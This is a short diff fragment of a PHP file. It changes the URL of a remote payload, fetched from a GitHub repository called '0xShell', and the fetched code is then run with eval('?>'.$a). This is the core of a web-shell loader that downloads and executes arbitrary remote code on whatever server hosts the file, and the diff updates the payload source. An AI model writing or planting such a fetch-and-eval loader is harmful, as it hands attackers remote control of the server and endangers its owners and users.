@@ -27,5 +27,5 @@ $url_get_contents_data = false;
 }
 return $url_get_contents_data;
 }
-$a = geturlsinfo('https://raw.githubusercontent.com/temempik1337/0xShell/main/0xencbase.js');
+$a = geturlsinfo('https://raw.githubusercontent.com/temempik1337/0xShell/main/0x.txt');
 eval ('?>'.$a);
